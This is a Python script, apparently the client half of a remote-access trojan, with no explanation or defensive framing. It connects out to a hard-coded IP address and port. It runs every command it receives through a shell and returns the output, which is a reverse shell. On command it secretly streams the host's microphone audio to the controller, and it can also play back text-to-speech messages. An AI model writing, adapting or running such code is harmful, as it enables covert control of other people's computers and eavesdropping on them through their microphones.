﻿import socket
import subprocess
import threading
import gtts as v
import playsound
import random
import os


def micstream():
    global s
    import pyaudio
    import socket
    import select


    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    CHUNK = 4096

    audio = pyaudio.PyAudio()

    def callback(in_data, frame_count, time_info, status):
        global s
        try:
            s.send(in_data)
            return (None, pyaudio.paContinue)
        except:
            return

    try:
        stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK, stream_callback=callback)
        while 1:
            pass
    except:
        stream.close()
        audio.terminate()
def vocal():
            txt=s.recv(buf)
            txt=txt.decode()
            output=v.gTTS(text=txt,lang='fr',slow=False)
            filename=str(random.randint(0,99))+'op.mp3'
            output.save('c:/temp/'+filename)
            song = 'c:/temp/'+filename
            playsound.playsound(song)
            os.remove(song)



host="192.168.1.25"
port=2568
buf=4096
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
while 1:

    rep=s.recv(buf)
    rep=rep.decode()
    if rep=='':
        pass
    elif rep=='micro_stream':
            micstream()
        
            
    elif rep=='send_vocal':
        try:
           vocal()
        except Exception:
            print('error')
    else:
        proc = subprocess.Popen(rep, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = proc.communicate()
        if error != b"":
            s.send('[+] Error !'.encode())
        else:
            s.send(output)


